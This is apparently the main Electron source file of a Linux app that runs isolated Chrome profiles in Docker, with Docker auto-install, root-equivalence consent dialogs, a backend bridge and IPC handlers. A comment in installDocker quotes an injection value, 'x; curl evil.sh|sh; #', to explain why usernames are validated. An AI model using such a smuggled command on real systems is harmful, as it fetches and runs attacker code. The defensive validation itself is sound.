const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const { spawn, spawnSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const { buildInstallSteps, displayUsername, isValidUsername, readUsername } = require('./docker_install');
const {
  BRIDGE_MAX_FAILURES,
  createBridgeQueue,
} = require('./bridge_queue');

// Use Wayland natively when the compositor is available; fall back to X11 otherwise
app.commandLine.appendSwitch('ozone-platform-hint', 'auto');
// AMD iGPU on Wayland: keep GPU in main process to avoid zygote GPU crash (error_code=1002)
app.commandLine.appendSwitch('in-process-gpu');

// ─────────────────────────────────────────────
// Config
// ─────────────────────────────────────────────
// When packaged as AppImage/deb, use the bundled PyInstaller bridge binary
// (no Python required on the host). In dev, fall back to python3.
let bridgeCmd, bridgeArgs;
if (app.isPackaged) {
  // electron-builder puts extraResources at <appDir>/resources/
  const bundled = path.join(process.resourcesPath, 'bridge');
  bridgeCmd  = bundled;
  bridgeArgs = [];
} else {
  bridgeCmd  = process.env.PYTHON_BIN || 'python3';
  bridgeArgs = [path.join(__dirname, '..', 'backend', 'bridge.py')];
}

// ─────────────────────────────────────────────
// Requirement checker + auto-installer
// ─────────────────────────────────────────────

/** Detect which package manager / distro we're running on. */
function detectDistro() {
  try {
    const osRelease = fs.readFileSync('/etc/os-release', 'utf8');
    const id = (osRelease.match(/^ID=(.+)$/m) || [])[1]?.replace(/"/g, '') || '';
    const like = (osRelease.match(/^ID_LIKE=(.+)$/m) || [])[1]?.replace(/"/g, '') || '';
    const combined = `${id} ${like}`.toLowerCase();
    if (combined.includes('arch') || combined.includes('manjaro') || combined.includes('endeavour')) return 'pacman';
    if (combined.includes('fedora')) return 'dnf-fedora';
    if (combined.includes('rhel') || combined.includes('centos') || combined.includes('rocky') || combined.includes('alma')) return 'dnf-rhel';
    if (combined.includes('opensuse') || combined.includes('suse')) return 'zypper';
    if (combined.includes('debian') || combined.includes('ubuntu') || combined.includes('mint') || combined.includes('pop')) return 'apt';
  } catch (_) { /* /etc/os-release unreadable */ }

  // Fallback: detect by binary
  for (const [bin, pm] of [['pacman','pacman'],['apt-get','apt'],['dnf','dnf-fedora'],['yum','dnf-rhel'],['zypper','zypper']]) {
    if (spawnSync('which', [bin], { stdio: 'ignore' }).status === 0) return pm;
  }
  return null;
}

/**
 * True if the current user is already a member of the `docker` group.
 * Membership is equivalent to root on the host, so this is a security-relevant
 * fact, not a cosmetic one.
 */
function isInDockerGroup() {
  // Only used to build `id -nG <user>` (an argument vector) and to compare
  // against `getent` output, so this is not a shell sink — but an invalid name
  // is still no use here, so treat it as "not a member" instead of passing
  // junk to spawn.
  const user = displayUsername(process.env);
  if (user === 'your account') return false;  // missing or not a valid username
  // Prefer getent (works for LDAP/SSSD users) and fall back to `id`.
  const getent = spawnSync('getent', ['group', 'docker'], { encoding: 'utf8' });
  if (getent.status === 0 && getent.stdout) {
    const members = (getent.stdout.split(':')[3] || '').split(',').filter(Boolean);
    if (members.includes(user)) return true;
  }
  const idOut = spawnSync('id', ['-nG', user], { encoding: 'utf8' });
  if (idOut.status === 0 && idOut.stdout) {
    return idOut.stdout.trim().split(/\s+/).includes('docker');
  }
  return false;
}

/**
 * The consent dialog shown immediately before any `usermod -aG docker`.
 * Returns true only on an explicit, informed confirmation.
 */
async function confirmDockerGroupConsent(user) {
  const { response } = await dialog.showMessageBox({
    type: 'warning',
    title: 'This is equivalent to giving up root',
    message: `Add "${user}" to the "docker" group?`,
    detail:
      'Read this before you agree — the docker group is NOT a limited permission.\n\n' +
      'The Docker daemon runs as root and has no per-command authorization, ' +
      'no audit log, and no policy of any kind. Anyone in the docker group can:\n' +
      '  • start a container that mounts the entire host filesystem as root\n' +
      '  • read and write any file on this machine, including SSH keys\n' +
      '  • load kernel modules, so it is a full root compromise, not a partial one\n' +
      '  • escape any container, including the isolated browser profiles this app creates\n\n' +
      'Any program running as you — including anything in this app — inherits that\n' +
      'power the moment you agree. Container isolation cannot protect the host from\n' +
      'the account that owns the Docker socket.\n\n' +
      'To undo this later:  sudo gpasswd -d <your-user> docker   (then log out and back in)\n' +
      'To install Docker without the group (every command needs sudo): choose Cancel ' +
      'and follow https://docs.docker.com/get-docker/',
    buttons: ['Cancel', 'I understand, add me'],
    defaultId: 0,   // Enter / Escape = safe option
    cancelId: 0,    // Escape must never grant root
    noLink: true,
  });
  return response === 1;
}

/** Install Docker using the detected package manager, via pkexec/sudo. */
async function installDocker(pm) {
  // USER/LOGNAME are attacker-influenceable and every step below runs as root,
  // so they are validated against a strict username allowlist up front. A value
  // like `x; curl evil.sh|sh; #` is refused here rather than reaching pkexec.
  const user = readUsername(process.env);

  // Consent gate — no `usermod -aG docker` may run without it.
  if (!await confirmDockerGroupConsent(user)) {
    const err = new Error('Docker group membership was declined.');
    err.userCancelled = true;
    throw err;
  }

  // Each entry is [program, args[]] — run sequentially; any failure throws.
  // The recipe table lives in ./docker_install.js so it can be tested without
  // an Electron runtime. No step places `user` inside a `bash -c` string: the
  // `usermod` call is its own argument vector, so it is never seen by a shell.
  const cmds = buildInstallSteps(pm, user);

  for (const [prog, args] of cmds) {
    const result = spawnSync(prog, args, { stdio: 'inherit' });
    if (result.status !== 0) throw new Error(`Command failed: ${prog} ${args.join(' ')}`);
  }
}

/**
 * Warn once per app launch if the user is already in the `docker` group.
 *
 * This is the state the app is normally in *after* a successful install, so
 * the install-time consent is not enough on its own: without this the user is
 * root-equivalent with no prompt at all on every subsequent launch. It is a
 * single informational dialog per launch (not per profile / per action), so it
 * is not noisy enough to justify dropping it in favour of docs only.
 */
async function warnIfDockerGroupMember() {
  let member = false;
  try { member = isInDockerGroup(); } catch (_) { /* detection failed — stay quiet */ }
  if (!member) return;
  // Display only — these strings are never executed, but an unvalidated
  // environment value would still be a spoofing vector inside a warning
  // dialog, so it is reduced to a safe placeholder.
  const user = displayUsername(process.env);
  await dialog.showMessageBox({
    type: 'warning',
    title: 'Security notice: docker group membership',
    message: `Your account (${user}) is a member of the "docker" group.`,
    detail:
      'The Docker daemon has no authorization layer, so this membership is\n' +
      'equivalent to full root access on this host. Any process running as you —\n' +
      'a browser add-on, a script, an npm postinstall, this app — can start a\n' +
      'root container that mounts and rewrites your whole filesystem.\n\n' +
      'The isolated browser profiles this app creates are NOT a boundary against\n' +
      'that: the account that owns the Docker socket is already the host.\n\n' +
      'If you did not intend this, remove it with:\n' +
      '  sudo gpasswd -d <your-user> docker\n' +
      'then log out and back in (or reboot). Docker will still work for the app\n' +
      'via a root-owned socket only if you reconfigure it — otherwise run the app\n' +
      'as a user you are willing to treat as root.',
    buttons: ['I understand'],
    defaultId: 0,
    cancelId: 0,
    noLink: true,
  });
}

/**
 * Check that Docker is present and the daemon is reachable.
 * If Docker is missing, offer to install it.
 * Returns true if ready, false if the user declined or install failed.
 */
async function checkRequirements() {
  // Docker present and usable
  const dockerMissing = spawnSync('docker', ['--version'], { stdio: 'ignore' }).status !== 0;

  if (!dockerMissing) {
    // The daemon socket is the privilege boundary — say so on every launch.
    await warnIfDockerGroupMember();
    // Check daemon (non-fatal — group membership may need re-login)
    const daemonOk = spawnSync('docker', ['info'], { stdio: 'ignore' }).status === 0;
    if (!daemonOk) {
      await dialog.showMessageBox({
        type: 'warning',
        title: 'Docker daemon not running',
        message: 'Docker is installed but the daemon is not reachable.\n\n' +
                 'Possible causes:\n' +
                 '  • Your user is not yet in the docker group (re-login required)\n' +
                 '  • The Docker service is stopped (run: sudo systemctl start docker)\n\n' +
                 'The app will continue but containers may fail to start.',
        buttons: ['OK'],
      });
    }
    return true; // docker binary present — proceed
  }

  // 3. Docker missing — ask to install
  const pm = detectDistro();
  const pmLabel = pm
    ? { pacman: 'pacman (Arch)', apt: 'apt (Debian/Ubuntu)', 'dnf-fedora': 'dnf (Fedora)',
        'dnf-rhel': 'dnf (RHEL/Rocky/Alma)', zypper: 'zypper (openSUSE)' }[pm]
    : 'unknown';

  const { response } = await dialog.showMessageBox({
    type: 'question',
    title: 'Docker not found',
    message: 'Chrome Isolation requires Docker to run isolated browser profiles.',
    detail: pm
      ? `Docker will be installed via ${pmLabel}.\n` +
        'A system authentication prompt will appear.\n\n' +
        'Adding your user to the docker group is part of this install and it is\n' +
        'equivalent to full root access — you will be asked to confirm that\n' +
        'explicitly on the next screen.\n\n' +
        'After installation a re-login may be required for group membership.'
      : 'Could not detect your package manager.\n' +
        'Please install Docker manually: https://docs.docker.com/get-docker/',
    buttons: pm ? ['Install Docker', 'Cancel'] : ['OK'],
    defaultId: 0,
    cancelId: pm ? 1 : 0,
  });

  if (!pm || response !== 0) return false;

  // 4. Run install — installDocker() shows the docker-group consent dialog and
  //    throws err.userCancelled if the user declines.
  try {
    await installDocker(pm);
  } catch (err) {
    if (err.userCancelled) {
      await dialog.showMessageBox({
        type: 'info',
        title: 'Installation cancelled',
        message: 'Docker was not modified.',
        detail: 'The app needs the Docker daemon to start a profile container, so it\n' +
                'cannot continue. You can install Docker yourself at any time:\n' +
                'https://docs.docker.com/get-docker/',
        buttons: ['OK'],
      });
      return false;
    }
    await dialog.showMessageBox({
      type: 'error',
      title: 'Docker installation failed',
      message: 'Could not install Docker automatically.',
      detail: `${err.message}\n\nPlease install Docker manually:\nhttps://docs.docker.com/get-docker/`,
      buttons: ['OK'],
    });
    return false;
  }

  await dialog.showMessageBox({
    type: 'warning',
    title: 'Docker installed — you now have root-equivalent access',
    message: 'Docker was installed successfully.',
    detail: `Your user (${displayUsername(process.env)}) was added to the\n` +
            'docker group, which is equivalent to full root access on this host.\n' +
            'This was necessary to run the app, but it applies to every program\n' +
            'running as you, not just this app.\n\n' +
            'You may need to re-login for group membership to take effect.\n' +
            'To revoke it later: sudo gpasswd -d <user> docker',
    buttons: ['Continue'],
    defaultId: 0,
    cancelId: 0,
  });
  return true;
}


// ─────────────────────────────────────────────
// Bridge lifecycle (F8 / T6)
//
// Restart policy, the request queue and the flush/give-up rules all live in
// ./bridge_queue.js so they can be tested without an Electron runtime — the
// regression this file is now wired to was invisible for exactly that reason.
// See tests/test_bridge_queue.mjs.
//
//   attempt 1 fails -> retry in   1s
//   attempt 2 fails -> retry in   2s
//   attempt 3 fails -> retry in   4s
//   attempt 4 fails -> retry in   8s
//   attempt 5 fails -> give up, show an error dialog
//
// "Consecutive" means the bridge did not survive BRIDGE_STABLE_MS (10s). A bridge
// that has been up that long counts as a fresh start, so a crash an hour into a
// session retries immediately instead of inheriting an old backoff. This is what
// keeps the first-launch path (T6 regression guard) working: the very first
// startBridge() is not a restart and is never counted as a failure.
const bridgeQueue = createBridgeQueue({
  cmd: bridgeCmd,
  args: bridgeArgs,
  spawnChild: spawn,
  // Forward Python tracebacks to console in dev
  forwardStderr: (d) => { if (!app.isPackaged) process.stderr.write(d); },
  notifyRenderer: ({ reason, message }) => mainWindow?.webContents.send('bridge:failed', { reason, message }),
  onGiveUp: async ({ message }) => {
    const { response } = await dialog.showMessageBox({
      type: 'error',
      title: 'Backend unavailable',
      message: 'Chrome Isolation could not start its background service.',
      detail: `${message}\n\n` +
              `It failed to start ${BRIDGE_MAX_FAILURES} times in a row. ` +
              'Any action that was in flight has been cancelled — please retry it.\n\n' +
              'Common causes: the bundled bridge is missing or not executable, ' +
              'Python is not installed, or the app directory is read-only.',
      buttons: ['Retry', 'Quit'],
      defaultId: 0,
      cancelId: 1,
    });
    return response === 0 ? 'retry' : 'quit';
  },
  onQuit: () => app.quit(),
});

const startBridge = () => bridgeQueue.startBridge();

/** Send a request to the Python bridge and return a Promise. */
const callBackend = (method, params) => bridgeQueue.callBackend(method, params);

// ─────────────────────────────────────────────
// Chromium update check kick-off
//
// Deliberately placed AFTER the window exists and NOT awaited. The bridge
// method returns as soon as the version check is handed to a background
// thread, so startup cannot be delayed by it — but firing it before the
// window would still be wrong, because a slow bridge spawn would then delay
// first paint for no user-visible benefit.
//
// THIS DETECTS. IT DOES NOT BUILD. Under the default policy the browser is
// never rebuilt without the user clicking "Apply now" (see `image:applyUpdate`),
// because upgrading Chromium cannot be undone: the browser will not downgrade
// a profile. The result — including `update_available` — is polled by the UI
// through `image:updateStatus`. The debounce floor and the single-flight lock
// mean repeated launches cost one lock attempt each, not one build each.
function kickOffImageUpdateCheck() {
  setTimeout(() => {
    callBackend('image_update_check', {}).catch((err) => {
      // The kill switch and the "already in progress" answer are normal
      // outcomes, not failures worth surfacing.
      if (!app.isPackaged) console.error('image update check:', err);
    });
  }, 2000);
}

// ─────────────────────────────────────────────
// Desktop entry refresh kick-off
//
// Desktop entries used to be written only when a profile was created, so an
// entry generated by an older build stayed wrong on disk indefinitely (a
// stale Icon=google-chrome, WebBrowser in Categories, a WM class that never
// matched the container's --class). This re-derives them from the current
// code, touching only files whose content actually changed, so a launcher can
// no longer compete for "default browser" or impersonate Google Chrome.
// Fired detached after the window exists: nothing on the request path waits
// on it, and a bridge that is not up yet just queues harmlessly.
function kickOffDesktopEntryRefresh() {
  callBackend('refresh_desktop_entries', {}).catch((err) => {
    if (!app.isPackaged) console.error('desktop entry refresh:', err);
  });
}

// ─────────────────────────────────────────────
// IPC handlers  (S3: no HTTP surface)
// ─────────────────────────────────────────────
function registerIpc() {
  ipcMain.handle('profiles:list', () => callBackend('list_profiles'));

  ipcMain.handle('profiles:create', (_, name, customPath, hostMount, proxy) =>
    callBackend('create_profile', {
      name,
      custom_path: customPath || '',
      host_mount: hostMount || '',
      proxy: proxy || '',
    })
  );

  ipcMain.handle('profiles:update', (_, name, hostMount, proxy, timezone) =>
    callBackend('update_profile', {
      name,
      host_mount: hostMount || '',
      proxy: proxy || '',
      timezone: timezone || '',
    })
  );

  // Native folder picker for the read-only host mount field
  ipcMain.handle('profiles:pickFolder', async () => {
    const { filePaths, canceled } = await dialog.showOpenDialog(mainWindow, {
      title: 'Select host folder (mounted read-only)',
      properties: ['openDirectory'],
    });
    if (canceled || !filePaths.length) return { canceled: true };
    return { canceled: false, path: filePaths[0] };
  });

  // ── Global proxy store ──────────────────────────────────────────────────────
  ipcMain.handle('proxies:list', () => callBackend('list_proxies'));
  ipcMain.handle('proxies:add', (_, name, url) =>
    callBackend('add_proxy', { name, url })
  );
  ipcMain.handle('proxies:delete', (_, name) =>
    callBackend('delete_proxy', { name })
  );

  ipcMain.handle('profiles:delete', (_, name) =>
    callBackend('delete_profile', { name })
  );

  ipcMain.handle('profiles:start', (_, name) =>
    callBackend('start_profile', { name })
  );

  ipcMain.handle('profiles:stop', (_, name) =>
    callBackend('stop_profile', { name })
  );

  ipcMain.handle('profiles:status', (_, name) =>
    callBackend('profile_status', { name })
  );

  // Chromium auto-update. The bridge method returns as soon as it has handed
  // the rebuild to a background thread, so this is not a blocking call — the
  // worst case is a fast refusal (kill switch set, a build already running, or
  // the debounce floor not yet elapsed). It is also fired detached, so a
  // bridge that is not up yet just queues harmlessly behind the normal queue.
  // Chromium update. `image:checkUpdate` DETECTS ONLY — it records what it
  // found (including `update_available`) and builds nothing. There is
  // deliberately no `force` parameter on this channel: a rebuild must go
  // through `image:applyUpdate`, which carries versioned consent.
  ipcMain.handle('image:checkUpdate', () => callBackend('image_update_check', {}));

  // THE CONSENT GATE. The user clicked "Apply now" after being shown the
  // one-way-door warning. `version` MUST be the value the status reports as
  // `consent_version`; the backend refuses to build a different version, and
  // instead refreshes the status so the UI can ask again.
  //
  // The warning text itself is NOT generated here. It comes back from the
  // backend on every status poll (`consent_warning` / `consent_warning_short`)
  // so the wording travels with the consent and cannot drift.
  ipcMain.handle('image:applyUpdate', (_, version) =>
    callBackend('image_update_apply', { version })
  );

  // Status poll for the UI. Reads a small in-memory dict; never blocks.
  //
  // RENDERER CONTRACT — `image:updateStatus` resolves to:
  //   state              one of STATES (see backend/image_update.py)
  //   update_available   true | false | null   (null = COULD NOT DETERMINE)
  //   current_version    string | null
  //   latest_version     string | null
  //   consent_required   boolean — true only when state === 'update_available'
  //   consent_version    string | null — pass this to image:applyUpdate
  //   consent_warning    string — long one-way-door text
  //   consent_warning_short string — one-line form for a button label
  //   policy             'disabled' | 'unattended' | 'notify_only'
  //   enabled            boolean
  //   auto_rebuild       boolean
  //   forced             boolean
  //   error              string | null
  //   last_result        string
  //   staging_tag        string | null
  //   started_at / finished_at   unix ts | null
  //   next_attempt_at    unix ts | null
  //   retry_in_seconds   number | null
  ipcMain.handle('image:updateStatus', () => callBackend('image_update_status', {}));

  // Export — open native save dialog, then call backend
  ipcMain.handle('profiles:export', async (_, name) => {
    const { filePath, canceled } = await dialog.showSaveDialog(mainWindow, {
      title: `Export profile "${name}"`,
      defaultPath: `${name}.zip`,
      filters: [{ name: 'ZIP Archive', extensions: ['zip'] }],
    });
    if (canceled || !filePath) return { canceled: true };
    return callBackend('export_profile', { name, dest_path: filePath });
  });

  // Import — open native open dialog, then call backend
  ipcMain.handle('profiles:import', async () => {
    const { filePaths, canceled } = await dialog.showOpenDialog(mainWindow, {
      title: 'Import profile archive',
      filters: [
        { name: 'Archives', extensions: ['zip', 'tar', 'tgz', 'tar.gz'] },
      ],
      properties: ['openFile'],
    });
    if (canceled || !filePaths.length) return { canceled: true };
    return callBackend('import_profile', { archive_path: filePaths[0] });
  });

  // ── Custom window controls (frameless window) ──────────────────────────────
  ipcMain.on('window:minimize',  () => mainWindow?.minimize());
  ipcMain.on('window:maximize',  () => {
    if (!mainWindow) return;
    mainWindow.isMaximized() ? mainWindow.unmaximize() : mainWindow.maximize();
  });
  ipcMain.on('window:close',     () => mainWindow?.close());
  ipcMain.handle('window:isMaximized', () => mainWindow?.isMaximized() ?? false);
}

// ─────────────────────────────────────────────
// Window
// ─────────────────────────────────────────────
let mainWindow = null;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1080,
    height: 700,
    minWidth: 760,
    minHeight: 520,
    title: 'Chrome Isolation',
    icon: path.join(__dirname, '..', 'assets', 'icons', 'icon.png'),
    transparent: true,        // allow CSS border-radius to show through
    frame: false,             // custom titlebar
    hasShadow: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true,
    },
  });

  mainWindow.loadFile(path.join(__dirname, 'renderer', 'index.html'));
  mainWindow.setMenuBarVisibility(false);

  // Notify renderer when maximize state changes
  mainWindow.on('maximize',   () => mainWindow.webContents.send('window:maximized',   true));
  mainWindow.on('unmaximize', () => mainWindow.webContents.send('window:maximized', false));

  mainWindow.on('closed', () => { mainWindow = null; });
}

// ─────────────────────────────────────────────
// Handle --profile <name> launch argument
// ─────────────────────────────────────────────
function handleProfileArg() {
  const idx = process.argv.indexOf('--profile');
  if (idx !== -1 && process.argv[idx + 1]) {
    const name = process.argv[idx + 1];
    callBackend('start_profile', { name }).catch(console.error);
  }
}

// ─────────────────────────────────────────────
// App lifecycle
// ─────────────────────────────────────────────
app.whenReady().then(async () => {
  // Start the bridge before the window so the renderer's first IPC call can
  // never hit a null bridge (callBackend queues until the bridge is up).
  startBridge();

  // Always create the window first so the user sees the UI while we check.
  createWindow();
  registerIpc();

  // Check Docker (and auto-install if missing). If the user cancels, quit.
  const ready = await checkRequirements();
  if (!ready) {
    app.quit();
    return;
  }

  handleProfileArg();

  // AFTER the window, and not awaited — see kickOffImageUpdateCheck().
  kickOffImageUpdateCheck();

  // AFTER the window, not awaited. Self-heals stale .desktop entries.
  kickOffDesktopEntryRefresh();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('quit', () => {
  bridgeQueue.dispose();
});
